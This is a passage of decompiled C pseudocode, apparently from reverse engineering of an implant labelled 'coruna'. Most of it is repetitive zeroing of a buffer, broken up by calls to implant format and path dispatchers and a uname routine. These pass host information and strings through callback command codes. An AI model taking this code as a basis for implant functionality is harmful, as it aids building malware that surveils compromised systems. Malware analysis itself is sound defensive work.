      stack_guard[0x71] = '\0';
      stack_guard[0x72] = '\0';
      stack_guard[0x73] = '\0';
      stack_guard[0x74] = '\0';
      stack_guard[0x75] = '\0';
      stack_guard[0x76] = '\0';
      stack_guard[0x77] = '\0';
      stack_guard[0x58] = '\0';
      stack_guard[0x59] = '\0';
      stack_guard[0x5a] = '\0';
      stack_guard[0x5b] = '\0';
      stack_guard[0x5c] = '\0';
      stack_guard[0x5d] = '\0';
      stack_guard[0x5e] = '\0';
      stack_guard[0x5f] = '\0';
      stack_guard[0x50] = '\0';
      stack_guard[0x51] = '\0';
      stack_guard[0x52] = '\0';
      stack_guard[0x53] = '\0';
      stack_guard[0x54] = '\0';
      stack_guard[0x55] = '\0';
      stack_guard[0x56] = '\0';
      stack_guard[0x57] = '\0';
      stack_guard[0x38] = '\0';
      stack_guard[0x39] = '\0';
      stack_guard[0x3a] = '\0';
      stack_guard[0x3b] = '\0';
      stack_guard[0x3c] = '\0';
      stack_guard[0x3d] = '\0';
      stack_guard[0x3e] = '\0';
      stack_guard[0x3f] = '\0';
      stack_guard[0x30] = '\0';
      stack_guard[0x31] = '\0';
      stack_guard[0x32] = '\0';
      stack_guard[0x33] = '\0';
      stack_guard[0x34] = '\0';
      stack_guard[0x35] = '\0';
      stack_guard[0x36] = '\0';
      stack_guard[0x37] = '\0';
      stack_guard[0x48] = '\0';
      stack_guard[0x49] = '\0';
      stack_guard[0x4a] = '\0';
      stack_guard[0x4b] = '\0';
      stack_guard[0x4c] = '\0';
      stack_guard[0x4d] = '\0';
      stack_guard[0x4e] = '\0';
      stack_guard[0x4f] = '\0';
      stack_guard[0x40] = '\0';
      stack_guard[0x41] = '\0';
      stack_guard[0x42] = '\0';
      stack_guard[0x43] = '\0';
      stack_guard[0x44] = '\0';
      stack_guard[0x45] = '\0';
      stack_guard[0x46] = '\0';
      stack_guard[0x47] = '\0';
      stack_guard[0x18] = '\0';
      stack_guard[0x19] = '\0';
      stack_guard[0x1a] = '\0';
      stack_guard[0x1b] = '\0';
      stack_guard[0x1c] = '\0';
      stack_guard[0x1d] = '\0';
      stack_guard[0x1e] = '\0';
      stack_guard[0x1f] = '\0';
      stack_guard[0x10] = '\0';
      stack_guard[0x11] = '\0';
      stack_guard[0x12] = '\0';
      stack_guard[0x13] = '\0';
      stack_guard[0x14] = '\0';
      stack_guard[0x15] = '\0';
      stack_guard[0x16] = '\0';
      stack_guard[0x17] = '\0';
      stack_guard[0x28] = '\0';
      stack_guard[0x29] = '\0';
      stack_guard[0x2a] = '\0';
      stack_guard[0x2b] = '\0';
      stack_guard[0x2c] = '\0';
      stack_guard[0x2d] = '\0';
      stack_guard[0x2e] = '\0';
      stack_guard[0x2f] = '\0';
      stack_guard[0x20] = '\0';
      stack_guard[0x21] = '\0';
      stack_guard[0x22] = '\0';
      stack_guard[0x23] = '\0';
      stack_guard[0x24] = '\0';
      stack_guard[0x25] = '\0';
      stack_guard[0x26] = '\0';
      stack_guard[0x27] = '\0';
      stack_guard[8] = '\0';
      stack_guard[9] = '\0';
      stack_guard[10] = '\0';
      stack_guard[0xb] = '\0';
      stack_guard[0xc] = '\0';
      stack_guard[0xd] = '\0';
      stack_guard[0xe] = '\0';
      stack_guard[0xf] = '\0';
      stack_guard[0] = '\0';
      stack_guard[1] = '\0';
      stack_guard[2] = '\0';
      stack_guard[3] = '\0';
      stack_guard[4] = '\0';
      stack_guard[5] = '\0';
      stack_guard[6] = '\0';
      stack_guard[7] = '\0';
      block_ctx = 0;
      port = coruna_implant_format_dispatch(arg,handle,status,stack_guard,0x200,&block_ctx);
      if ((int)port == 0x30001) {
        port = coruna_uname(arg,handle,status,stack_guard,0x200,&block_ctx);
      }
      if ((int)port == 0) {
        ptr = _strdup(stack_guard);
        if (ptr == (char *)0x0) {
          port = 0xad009;
        }
        else {
          buf = *(void (**)(arg + 0xe8);
          ls7 = _strlen(ptr);
          port = (*buf)(arg,0x70001,ptr,(int)ls7 + 1);
          if (((int)port == 0) &&
             (port = (**(void (**)(arg + 0xe8))(arg,0x70002,block_ctx,0x20),
             (int)port == 0)) {
            str = *(char **)(arg + 0x78);
            if (str != (char *)0x0) {
              buf = *(void (**)(arg + 0xe8);
              ls7 = _strlen(str);
              port = (*buf)(arg,0x70003,str,(int)ls7 + 1);
              if ((int)port != 0) goto skip;
            }
            str = *(char **)(arg + 0xa0);
            if (str != (char *)0x0) {
              buf = *(void (**)(arg + 0xe8);
              ls7 = _strlen(str);
              port = (*buf)(arg,0x70004,str,(int)ls7 + 1);
              if ((int)port != 0) goto skip;
            }
            port = 0;
            *n = action;
            *m = (uint)host_info;
            goto fail;
          }
skip:
          ls7 = _strlen(ptr);
          _bzero(ptr,ls7);
          _free(ptr);
        }
      }
      _bzero(action,host_info & 0xffffffff);
      _free(action);
      goto fail;
    }
    if (*(long *)(arg + 0x110) != 0) {
      port = 0xad001;
      if (*(long *)(arg + 0xe8) == 0) goto fail;
      stack_guard[0x1e8] = '\0';
      stack_guard[0x1e9] = '\0';
      stack_guard[0x1ea] = '\0';
      stack_guard[0x1eb] = '\0';
      stack_guard[0x1ec] = '\0';
      stack_guard[0x1ed] = '\0';
      stack_guard[0x1ee] = '\0';
      stack_guard[0x1ef] = '\0';
      stack_guard[0x1e0] = '\0';
      stack_guard[0x1e1] = '\0';
      stack_guard[0x1e2] = '\0';
      stack_guard[0x1e3] = '\0';
      stack_guard[0x1e4] = '\0';
      stack_guard[0x1e5] = '\0';
      stack_guard[0x1e6] = '\0';
      stack_guard[0x1e7] = '\0';
      stack_guard[0x1f8] = '\0';
      stack_guard[0x1f9] = '\0';
      stack_guard[0x1fa] = '\0';
      stack_guard[0x1fb] = '\0';
      stack_guard[0x1fc] = '\0';
      stack_guard[0x1fd] = '\0';
      stack_guard[0x1fe] = '\0';
      stack_guard[0x1ff] = '\0';
      stack_guard[0x1f0] = '\0';
      stack_guard[0x1f1] = '\0';
      stack_guard[0x1f2] = '\0';
      stack_guard[499] = '\0';
      stack_guard[500] = '\0';
      stack_guard[0x1f5] = '\0';
      stack_guard[0x1f6] = '\0';
      stack_guard[0x1f7] = '\0';
      stack_guard[0x1c8] = '\0';
      stack_guard[0x1c9] = '\0';
      stack_guard[0x1ca] = '\0';
      stack_guard[0x1cb] = '\0';
      stack_guard[0x1cc] = '\0';
      stack_guard[0x1cd] = '\0';
      stack_guard[0x1ce] = '\0';
      stack_guard[0x1cf] = '\0';
      stack_guard[0x1c0] = '\0';
      stack_guard[0x1c1] = '\0';
      stack_guard[0x1c2] = '\0';
      stack_guard[0x1c3] = '\0';
      stack_guard[0x1c4] = '\0';
      stack_guard[0x1c5] = '\0';
      stack_guard[0x1c6] = '\0';
      stack_guard[0x1c7] = '\0';
      stack_guard[0x1d8] = '\0';
      stack_guard[0x1d9] = '\0';
      stack_guard[0x1da] = '\0';
      stack_guard[0x1db] = '\0';
      stack_guard[0x1dc] = '\0';
      stack_guard[0x1dd] = '\0';
      stack_guard[0x1de] = '\0';
      stack_guard[0x1df] = '\0';
      stack_guard[0x1d0] = '\0';
      stack_guard[0x1d1] = '\0';
      stack_guard[0x1d2] = '\0';
      stack_guard[0x1d3] = '\0';
      stack_guard[0x1d4] = '\0';
      stack_guard[0x1d5] = '\0';
      stack_guard[0x1d6] = '\0';
      stack_guard[0x1d7] = '\0';
      stack_guard[0x1a8] = '\0';
      stack_guard[0x1a9] = '\0';
      stack_guard[0x1aa] = '\0';
      stack_guard[0x1ab] = '\0';
      stack_guard[0x1ac] = '\0';
      stack_guard[0x1ad] = '\0';
      stack_guard[0x1ae] = '\0';
      stack_guard[0x1af] = '\0';
      stack_guard[0x1a0] = '\0';
      stack_guard[0x1a1] = '\0';
      stack_guard[0x1a2] = '\0';
      stack_guard[0x1a3] = '\0';
      stack_guard[0x1a4] = '\0';
      stack_guard[0x1a5] = '\0';
      stack_guard[0x1a6] = '\0';
      stack_guard[0x1a7] = '\0';
      stack_guard[0x1b8] = '\0';
      stack_guard[0x1b9] = '\0';
      stack_guard[0x1ba] = '\0';
      stack_guard[0x1bb] = '\0';
      stack_guard[0x1bc] = '\0';
      stack_guard[0x1bd] = '\0';
      stack_guard[0x1be] = '\0';
      stack_guard[0x1bf] = '\0';
      stack_guard[0x1b0] = '\0';
      stack_guard[0x1b1] = '\0';
      stack_guard[0x1b2] = '\0';
      stack_guard[0x1b3] = '\0';
      stack_guard[0x1b4] = '\0';
      stack_guard[0x1b5] = '\0';
      stack_guard[0x1b6] = '\0';
      stack_guard[0x1b7] = '\0';
      stack_guard[0x188] = '\0';
      stack_guard[0x189] = '\0';
      stack_guard[0x18a] = '\0';
      stack_guard[0x18b] = '\0';
      stack_guard[0x18c] = '\0';
      stack_guard[0x18d] = '\0';
      stack_guard[0x18e] = '\0';
      stack_guard[399] = '\0';
      stack_guard[0x180] = '\0';
      stack_guard[0x181] = '\0';
      stack_guard[0x182] = '\0';
      stack_guard[0x183] = '\0';
      stack_guard[0x184] = '\0';
      stack_guard[0x185] = '\0';
      stack_guard[0x186] = '\0';
      stack_guard[0x187] = '\0';
      stack_guard[0x198] = '\0';
      stack_guard[0x199] = '\0';
      stack_guard[0x19a] = '\0';
      stack_guard[0x19b] = '\0';
      stack_guard[0x19c] = '\0';
      stack_guard[0x19d] = '\0';
      stack_guard[0x19e] = '\0';
      stack_guard[0x19f] = '\0';
      stack_guard[400] = '\0';
      stack_guard[0x191] = '\0';
      stack_guard[0x192] = '\0';
      stack_guard[0x193] = '\0';
      stack_guard[0x194] = '\0';
      stack_guard[0x195] = '\0';
      stack_guard[0x196] = '\0';
      stack_guard[0x197] = '\0';
      stack_guard[0x168] = '\0';
      stack_guard[0x169] = '\0';
      stack_guard[0x16a] = '\0';
      stack_guard[0x16b] = '\0';
      stack_guard[0x16c] = '\0';
      stack_guard[0x16d] = '\0';
      stack_guard[0x16e] = '\0';
      stack_guard[0x16f] = '\0';
      stack_guard[0x160] = '\0';
      stack_guard[0x161] = '\0';
      stack_guard[0x162] = '\0';
      stack_guard[0x163] = '\0';
      stack_guard[0x164] = '\0';
      stack_guard[0x165] = '\0';
      stack_guard[0x166] = '\0';
      stack_guard[0x167] = '\0';
      stack_guard[0x178] = '\0';
      stack_guard[0x179] = '\0';
      stack_guard[0x17a] = '\0';
      stack_guard[0x17b] = '\0';
      stack_guard[0x17c] = '\0';
      stack_guard[0x17d] = '\0';
      stack_guard[0x17e] = '\0';
      stack_guard[0x17f] = '\0';
      stack_guard[0x170] = '\0';
      stack_guard[0x171] = '\0';
      stack_guard[0x172] = '\0';
      stack_guard[0x173] = '\0';
      stack_guard[0x174] = '\0';
      stack_guard[0x175] = '\0';
      stack_guard[0x176] = '\0';
      stack_guard[0x177] = '\0';
      stack_guard[0x148] = '\0';
      stack_guard[0x149] = '\0';
      stack_guard[0x14a] = '\0';
      stack_guard[0x14b] = '\0';
      stack_guard[0x14c] = '\0';
      stack_guard[0x14d] = '\0';
      stack_guard[0x14e] = '\0';
      stack_guard[0x14f] = '\0';
      stack_guard[0x140] = '\0';
      stack_guard[0x141] = '\0';
      stack_guard[0x142] = '\0';
      stack_guard[0x143] = '\0';
      stack_guard[0x144] = '\0';
      stack_guard[0x145] = '\0';
      stack_guard[0x146] = '\0';
      stack_guard[0x147] = '\0';
      stack_guard[0x158] = '\0';
      stack_guard[0x159] = '\0';
      stack_guard[0x15a] = '\0';
      stack_guard[0x15b] = '\0';
      stack_guard[0x15c] = '\0';
      stack_guard[0x15d] = '\0';
      stack_guard[0x15e] = '\0';
      stack_guard[0x15f] = '\0';
      stack_guard[0x150] = '\0';
      stack_guard[0x151] = '\0';
      stack_guard[0x152] = '\0';
      stack_guard[0x153] = '\0';
      stack_guard[0x154] = '\0';
      stack_guard[0x155] = '\0';
      stack_guard[0x156] = '\0';
      stack_guard[0x157] = '\0';
      stack_guard[0x128] = '\0';
      stack_guard[0x129] = '\0';
      stack_guard[0x12a] = '\0';
      stack_guard[299] = '\0';
      stack_guard[300] = '\0';
      stack_guard[0x12d] = '\0';
      stack_guard[0x12e] = '\0';
      stack_guard[0x12f] = '\0';
      stack_guard[0x120] = '\0';
      stack_guard[0x121] = '\0';
      stack_guard[0x122] = '\0';
      stack_guard[0x123] = '\0';
      stack_guard[0x124] = '\0';
      stack_guard[0x125] = '\0';
      stack_guard[0x126] = '\0';
      stack_guard[0x127] = '\0';
      stack_guard[0x138] = '\0';
      stack_guard[0x139] = '\0';
      stack_guard[0x13a] = '\0';
      stack_guard[0x13b] = '\0';
      stack_guard[0x13c] = '\0';
      stack_guard[0x13d] = '\0';
      stack_guard[0x13e] = '\0';
      stack_guard[0x13f] = '\0';
      stack_guard[0x130] = '\0';
      stack_guard[0x131] = '\0';
      stack_guard[0x132] = '\0';
      stack_guard[0x133] = '\0';
      stack_guard[0x134] = '\0';
      stack_guard[0x135] = '\0';
      stack_guard[0x136] = '\0';
      stack_guard[0x137] = '\0';
      stack_guard[0x108] = '\0';
      stack_guard[0x109] = '\0';
      stack_guard[0x10a] = '\0';
      stack_guard[0x10b] = '\0';
      stack_guard[0x10c] = '\0';
      stack_guard[0x10d] = '\0';
      stack_guard[0x10e] = '\0';
      stack_guard[0x10f] = '\0';
      stack_guard[0x100] = '\0';
      stack_guard[0x101] = '\0';
      stack_guard[0x102] = '\0';
      stack_guard[0x103] = '\0';
      stack_guard[0x104] = '\0';
      stack_guard[0x105] = '\0';
      stack_guard[0x106] = '\0';
      stack_guard[0x107] = '\0';
      stack_guard[0x118] = '\0';
      stack_guard[0x119] = '\0';
      stack_guard[0x11a] = '\0';
      stack_guard[0x11b] = '\0';
      stack_guard[0x11c] = '\0';
      stack_guard[0x11d] = '\0';
      stack_guard[0x11e] = '\0';
      stack_guard[0x11f] = '\0';
      stack_guard[0x110] = '\0';
      stack_guard[0x111] = '\0';
      stack_guard[0x112] = '\0';
      stack_guard[0x113] = '\0';
      stack_guard[0x114] = '\0';
      stack_guard[0x115] = '\0';
      stack_guard[0x116] = '\0';
      stack_guard[0x117] = '\0';
      stack_guard[0xe8] = '\0';
      stack_guard[0xe9] = '\0';
      stack_guard[0xea] = '\0';
      stack_guard[0xeb] = '\0';
      stack_guard[0xec] = '\0';
      stack_guard[0xed] = '\0';
      stack_guard[0xee] = '\0';
      stack_guard[0xef] = '\0';
      stack_guard[0xe0] = '\0';
      stack_guard[0xe1] = '\0';
      stack_guard[0xe2] = '\0';
      stack_guard[0xe3] = '\0';
      stack_guard[0xe4] = '\0';
      stack_guard[0xe5] = '\0';
      stack_guard[0xe6] = '\0';
      stack_guard[0xe7] = '\0';
      stack_guard[0xf8] = '\0';
      stack_guard[0xf9] = '\0';
      stack_guard[0xfa] = '\0';
      stack_guard[0xfb] = '\0';
      stack_guard[0xfc] = '\0';
      stack_guard[0xfd] = '\0';
      stack_guard[0xfe] = '\0';
      stack_guard[0xff] = '\0';
      stack_guard[0xf0] = '\0';
      stack_guard[0xf1] = '\0';
      stack_guard[0xf2] = '\0';
      stack_guard[0xf3] = '\0';
      stack_guard[0xf4] = '\0';
      stack_guard[0xf5] = '\0';
      stack_guard[0xf6] = '\0';
      stack_guard[0xf7] = '\0';
      stack_guard[200] = '\0';
      stack_guard[0xc9] = '\0';
      stack_guard[0xca] = '\0';
      stack_guard[0xcb] = '\0';
      stack_guard[0xcc] = '\0';
      stack_guard[0xcd] = '\0';
      stack_guard[0xce] = '\0';
      stack_guard[0xcf] = '\0';
      stack_guard[0xc0] = '\0';
      stack_guard[0xc1] = '\0';
      stack_guard[0xc2] = '\0';
      stack_guard[0xc3] = '\0';
      stack_guard[0xc4] = '\0';
      stack_guard[0xc5] = '\0';
      stack_guard[0xc6] = '\0';
      stack_guard[199] = '\0';
      stack_guard[0xd8] = '\0';
      stack_guard[0xd9] = '\0';
      stack_guard[0xda] = '\0';
      stack_guard[0xdb] = '\0';
      stack_guard[0xdc] = '\0';
      stack_guard[0xdd] = '\0';
      stack_guard[0xde] = '\0';
      stack_guard[0xdf] = '\0';
      stack_guard[0xd0] = '\0';
      stack_guard[0xd1] = '\0';
      stack_guard[0xd2] = '\0';
      stack_guard[0xd3] = '\0';
      stack_guard[0xd4] = '\0';
      stack_guard[0xd5] = '\0';
      stack_guard[0xd6] = '\0';
      stack_guard[0xd7] = '\0';
      stack_guard[0xa8] = '\0';
      stack_guard[0xa9] = '\0';
      stack_guard[0xaa] = '\0';
      stack_guard[0xab] = '\0';
      stack_guard[0xac] = '\0';
      stack_guard[0xad] = '\0';
      stack_guard[0xae] = '\0';
      stack_guard[0xaf] = '\0';
      stack_guard[0xa0] = '\0';
      stack_guard[0xa1] = '\0';
      stack_guard[0xa2] = '\0';
      stack_guard[0xa3] = '\0';
      stack_guard[0xa4] = '\0';
      stack_guard[0xa5] = '\0';
      stack_guard[0xa6] = '\0';
      stack_guard[0xa7] = '\0';
      stack_guard[0xb8] = '\0';
      stack_guard[0xb9] = '\0';
      stack_guard[0xba] = '\0';
      stack_guard[0xbb] = '\0';
      stack_guard[0xbc] = '\0';
      stack_guard[0xbd] = '\0';
      stack_guard[0xbe] = '\0';
      stack_guard[0xbf] = '\0';
      stack_guard[0xb0] = '\0';
      stack_guard[0xb1] = '\0';
      stack_guard[0xb2] = '\0';
      stack_guard[0xb3] = '\0';
      stack_guard[0xb4] = '\0';
      stack_guard[0xb5] = '\0';
      stack_guard[0xb6] = '\0';
      stack_guard[0xb7] = '\0';
      stack_guard[0x88] = '\0';
      stack_guard[0x89] = '\0';
      stack_guard[0x8a] = '\0';
      stack_guard[0x8b] = '\0';
      stack_guard[0x8c] = '\0';
      stack_guard[0x8d] = '\0';
      stack_guard[0x8e] = '\0';
      stack_guard[0x8f] = '\0';
      stack_guard[0x80] = '\0';
      stack_guard[0x81] = '\0';
      stack_guard[0x82] = '\0';
      stack_guard[0x83] = '\0';
      stack_guard[0x84] = '\0';
      stack_guard[0x85] = '\0';
      stack_guard[0x86] = '\0';
      stack_guard[0x87] = '\0';
      stack_guard[0x98] = '\0';
      stack_guard[0x99] = '\0';
      stack_guard[0x9a] = '\0';
      stack_guard[0x9b] = '\0';
      stack_guard[0x9c] = '\0';
      stack_guard[0x9d] = '\0';
      stack_guard[0x9e] = '\0';
      stack_guard[0x9f] = '\0';
      stack_guard[0x90] = '\0';
      stack_guard[0x91] = '\0';
      stack_guard[0x92] = '\0';
      stack_guard[0x93] = '\0';
      stack_guard[0x94] = '\0';
      stack_guard[0x95] = '\0';
      stack_guard[0x96] = '\0';
      stack_guard[0x97] = '\0';
      stack_guard[0x68] = '\0';
      stack_guard[0x69] = '\0';
      stack_guard[0x6a] = '\0';
      stack_guard[0x6b] = '\0';
      stack_guard[0x6c] = '\0';
      stack_guard[0x6d] = '\0';
      stack_guard[0x6e] = '\0';
      stack_guard[0x6f] = '\0';
      stack_guard[0x60] = '\0';
      stack_guard[0x61] = '\0';
      stack_guard[0x62] = '\0';
      stack_guard[99] = '\0';
      stack_guard[100] = '\0';
      stack_guard[0x65] = '\0';
      stack_guard[0x66] = '\0';
      stack_guard[0x67] = '\0';
      stack_guard[0x78] = '\0';
      stack_guard[0x79] = '\0';
      stack_guard[0x7a] = '\0';
      stack_guard[0x7b] = '\0';
      stack_guard[0x7c] = '\0';
      stack_guard[0x7d] = '\0';
      stack_guard[0x7e] = '\0';
      stack_guard[0x7f] = '\0';
      stack_guard[0x70] = '\0';
      stack_guard[0x71] = '\0';
      stack_guard[0x72] = '\0';
      stack_guard[0x73] = '\0';
      stack_guard[0x74] = '\0';
      stack_guard[0x75] = '\0';
      stack_guard[0x76] = '\0';
      stack_guard[0x77] = '\0';
      stack_guard[0x58] = '\0';
      stack_guard[0x59] = '\0';
      stack_guard[0x5a] = '\0';
      stack_guard[0x5b] = '\0';
      stack_guard[0x5c] = '\0';
      stack_guard[0x5d] = '\0';
      stack_guard[0x5e] = '\0';
      stack_guard[0x5f] = '\0';
      stack_guard[0x50] = '\0';
      stack_guard[0x51] = '\0';
      stack_guard[0x52] = '\0';
      stack_guard[0x53] = '\0';
      stack_guard[0x54] = '\0';
      stack_guard[0x55] = '\0';
      stack_guard[0x56] = '\0';
      stack_guard[0x57] = '\0';
      stack_guard[0x38] = '\0';
      stack_guard[0x39] = '\0';
      stack_guard[0x3a] = '\0';
      stack_guard[0x3b] = '\0';
      stack_guard[0x3c] = '\0';
      stack_guard[0x3d] = '\0';
      stack_guard[0x3e] = '\0';
      stack_guard[0x3f] = '\0';
      stack_guard[0x30] = '\0';
      stack_guard[0x31] = '\0';
      stack_guard[0x32] = '\0';
      stack_guard[0x33] = '\0';
      stack_guard[0x34] = '\0';
      stack_guard[0x35] = '\0';
      stack_guard[0x36] = '\0';
      stack_guard[0x37] = '\0';
      stack_guard[0x48] = '\0';
      stack_guard[0x49] = '\0';
      stack_guard[0x4a] = '\0';
      stack_guard[0x4b] = '\0';
      stack_guard[0x4c] = '\0';
      stack_guard[0x4d] = '\0';
      stack_guard[0x4e] = '\0';
      stack_guard[0x4f] = '\0';
      stack_guard[0x40] = '\0';
      stack_guard[0x41] = '\0';
      stack_guard[0x42] = '\0';
      stack_guard[0x43] = '\0';
      stack_guard[0x44] = '\0';
      stack_guard[0x45] = '\0';
      stack_guard[0x46] = '\0';
      stack_guard[0x47] = '\0';
      stack_guard[0x18] = '\0';
      stack_guard[0x19] = '\0';
      stack_guard[0x1a] = '\0';
      stack_guard[0x1b] = '\0';
      stack_guard[0x1c] = '\0';
      stack_guard[0x1d] = '\0';
      stack_guard[0x1e] = '\0';
      stack_guard[0x1f] = '\0';
      stack_guard[0x10] = '\0';
      stack_guard[0x11] = '\0';
      stack_guard[0x12] = '\0';
      stack_guard[0x13] = '\0';
      stack_guard[0x14] = '\0';
      stack_guard[0x15] = '\0';
      stack_guard[0x16] = '\0';
      stack_guard[0x17] = '\0';
      stack_guard[0x28] = '\0';
      stack_guard[0x29] = '\0';
      stack_guard[0x2a] = '\0';
      stack_guard[0x2b] = '\0';
      stack_guard[0x2c] = '\0';
      stack_guard[0x2d] = '\0';
      stack_guard[0x2e] = '\0';
      stack_guard[0x2f] = '\0';
      stack_guard[0x20] = '\0';
      stack_guard[0x21] = '\0';
      stack_guard[0x22] = '\0';
      stack_guard[0x23] = '\0';
      stack_guard[0x24] = '\0';
      stack_guard[0x25] = '\0';
      stack_guard[0x26] = '\0';
      stack_guard[0x27] = '\0';
      stack_guard[8] = '\0';
      stack_guard[9] = '\0';
      stack_guard[10] = '\0';
      stack_guard[0xb] = '\0';
      stack_guard[0xc] = '\0';
      stack_guard[0xd] = '\0';
      stack_guard[0xe] = '\0';
      stack_guard[0xf] = '\0';
      stack_guard[0] = '\0';
      stack_guard[1] = '\0';
      stack_guard[2] = '\0';
      stack_guard[3] = '\0';
      stack_guard[4] = '\0';
      stack_guard[5] = '\0';
      stack_guard[6] = '\0';
      stack_guard[7] = '\0';
      block_ctx = 0;
      port = coruna_implant_format_dispatch(arg,bootargs,scratch,stack_guard,0x200,&block_ctx);
      if ((int)port == 0) {
        action = (void *)0x0;
        serial_buf = 0;
        port = coruna_implant_path_dispatch(arg,stack_guard,*(uint32_t *)(handle + 4),block_ctx,&action,
                              &serial_buf);
        if ((int)port == 0) {
          host_info = 0;
          thread_attr = 0;
          port = (**(void (**)(arg + 0x110))(arg,0x70000,&host_info,&thread_attr);
          if ((int)port == 0) {
            stack_guard[0x1e8] = '\0';
            stack_guard[0x1e9] = '\0';
            stack_guard[0x1ea] = '\0';
            stack_guard[0x1eb] = '\0';
            stack_guard[0x1ec] = '\0';
            stack_guard[0x1ed] = '\0';
            stack_guard[0x1ee] = '\0';
            stack_guard[0x1ef] = '\0';
            stack_guard[0x1e0] = '\0';
            stack_guard[0x1e1] = '\0';
            stack_guard[0x1e2] = '\0';
            stack_guard[0x1e3] = '\0';
            stack_guard[0x1e4] = '\0';
            stack_guard[0x1e5] = '\0';
            stack_guard[0x1e6] = '\0';
            stack_guard[0x1e7] = '\0';
            stack_guard[0x1f8] = '\0';
            stack_guard[0x1f9] = '\0';
            stack_guard[0x1fa] = '\0';
            stack_guard[0x1fb] = '\0';
            stack_guard[0x1fc] = '\0';
            stack_guard[0x1fd] = '\0';
            stack_guard[0x1fe] = '\0';
            stack_guard[0x1ff] = '\0';
            stack_guard[0x1f0] = '\0';
            stack_guard[0x1f1] = '\0';
            stack_guard[0x1f2] = '\0';
            stack_guard[499] = '\0';
            stack_guard[500] = '\0';
            stack_guard[0x1f5] = '\0';
            stack_guard[0x1f6] = '\0';
            stack_guard[0x1f7] = '\0';
            stack_guard[0x1c8] = '\0';
            stack_guard[0x1c9] = '\0';
            stack_guard[0x1ca] = '\0';
            stack_guard[0x1cb] = '\0';
            stack_guard[0x1cc] = '\0';
            stack_guard[0x1cd] = '\0';
            stack_guard[0x1ce] = '\0';
            stack_guard[0x1cf] = '\0';
            stack_guard[0x1c0] = '\0';
            stack_guard[0x1c1] = '\0';
            stack_guard[0x1c2] = '\0';
            stack_guard[0x1c3] = '\0';
            stack_guard[0x1c4] = '\0';
            stack_guard[0x1c5] = '\0';
            stack_guard[0x1c6] = '\0';
            stack_guard[0x1c7] = '\0';
            stack_guard[0x1d8] = '\0';
            stack_guard[0x1d9] = '\0';
            stack_guard[0x1da] = '\0';
            stack_guard[0x1db] = '\0';
            stack_guard[0x1dc] = '\0';
            stack_guard[0x1dd] = '\0';
            stack_guard[0x1de] = '\0';
            stack_guard[0x1df] = '\0';
            stack_guard[0x1d0] = '\0';
            stack_guard[0x1d1] = '\0';
            stack_guard[0x1d2] = '\0';
            stack_guard[0x1d3] = '\0';
            stack_guard[0x1d4] = '\0';
            stack_guard[0x1d5] = '\0';
            stack_guard[0x1d6] = '\0';
            stack_guard[0x1d7] = '\0';
            stack_guard[0x1a8] = '\0';
            stack_guard[0x1a9] = '\0';
            stack_guard[0x1aa] = '\0';
            stack_guard[0x1ab] = '\0';
            stack_guard[0x1ac] = '\0';
            stack_guard[0x1ad] = '\0';
            stack_guard[0x1ae] = '\0';
            stack_guard[0x1af] = '\0';
            stack_guard[0x1a0] = '\0';
            stack_guard[0x1a1] = '\0';
            stack_guard[0x1a2] = '\0';
            stack_guard[0x1a3] = '\0';
            stack_guard[0x1a4] = '\0';
            stack_guard[0x1a5] = '\0';
            stack_guard[0x1a6] = '\0';
            stack_guard[0x1a7] = '\0';
            stack_guard[0x1b8] = '\0';
            stack_guard[0x1b9] = '\0';
            stack_guard[0x1ba] = '\0';
            stack_guard[0x1bb] = '\0';
            stack_guard[0x1bc] = '\0';
            stack_guard[0x1bd] = '\0';
            stack_guard[0x1be] = '\0';
            stack_guard[0x1bf] = '\0';
            stack_guard[0x1b0] = '\0';
            stack_guard[0x1b1] = '\0';
            stack_guard[0x1b2] = '\0';
            stack_guard[0x1b3] = '\0';
            stack_guard[0x1b4] = '\0';
            stack_guard[0x1b5] = '\0';
            stack_guard[0x1b6] = '\0';
            stack_guard[0x1b7] = '\0';
            stack_guard[0x188] = '\0';
            stack_guard[0x189] = '\0';
            stack_guard[0x18a] = '\0';
            stack_guard[0x18b] = '\0';
            stack_guard[0x18c] = '\0';
            stack_guard[0x18d] = '\0';
            stack_guard[0x18e] = '\0';
            stack_guard[399] = '\0';
            stack_guard[0x180] = '\0';
            stack_guard[0x181] = '\0';
            stack_guard[0x182] = '\0';
            stack_guard[0x183] = '\0';
            stack_guard[0x184] = '\0';
            stack_guard[0x185] = '\0';
            stack_guard[0x186] = '\0';
            stack_guard[0x187] = '\0';
            stack_guard[0x198] = '\0';
            stack_guard[0x199] = '\0';
            stack_guard[0x19a] = '\0';
            stack_guard[0x19b] = '\0';
            stack_guard[0x19c] = '\0';
            stack_guard[0x19d] = '\0';
            stack_guard[0x19e] = '\0';
            stack_guard[0x19f] = '\0';
            stack_guard[400] = '\0';
            stack_guard[0x191] = '\0';
            stack_guard[0x192] = '\0';
            stack_guard[0x193] = '\0';
            stack_guard[0x194] = '\0';
            stack_guard[0x195] = '\0';
            stack_guard[0x196] = '\0';
            stack_guard[0x197] = '\0';
            stack_guard[0x168] = '\0';
            stack_guard[0x169] = '\0';
            stack_guard[0x16a] = '\0';
            stack_guard[0x16b] = '\0';
            stack_guard[0x16c] = '\0';
            stack_guard[0x16d] = '\0';
            stack_guard[0x16e] = '\0';
            stack_guard[0x16f] = '\0';
            stack_guard[0x160] = '\0';
            stack_guard[0x161] = '\0';
            stack_guard[0x162] = '\0';
            stack_guard[0x163] = '\0';
            stack_guard[0x164] = '\0';
            stack_guard[0x165] = '\0';
            stack_guard[0x166] = '\0';
            stack_guard[0x167] = '\0';
            stack_guard[0x178] = '\0';
            stack_guard[0x179] = '\0';
            stack_guard[0x17a] = '\0';
            stack_guard[0x17b] = '\0';
            stack_guard[0x17c] = '\0';
            stack_guard[0x17d] = '\0';
            stack_guard[0x17e] = '\0';
            stack_guard[0x17f] = '\0';
            stack_guard[0x170] = '\0';
            stack_guard[0x171] = '\0';
            stack_guard[0x172] = '\0';
            stack_guard[0x173] = '\0';
            stack_guard[0x174] = '\0';
            stack_guard[0x175] = '\0';
            stack_guard[0x176] = '\0';
            stack_guard[0x177] = '\0';
            stack_guard[0x148] = '\0';
            stack_guard[0x149] = '\0';
            stack_guard[0x14a] = '\0';
            stack_guard[0x14b] = '\0';
            stack_guard[0x14c] = '\0';
            stack_guard[0x14d] = '\0';
            stack_guard[0x14e] = '\0';
            stack_guard[0x14f] = '\0';
            stack_guard[0x140] = '\0';
            stack_guard[0x141] = '\0';
            stack_guard[0x142] = '\0';
            stack_guard[0x143] = '\0';
            stack_guard[0x144] = '\0';
            stack_guard[0x145] = '\0';
            stack_guard[0x146] = '\0';
            stack_guard[0x147] = '\0';
            stack_guard[0x158] = '\0';
            stack_guard[0x159] = '\0';
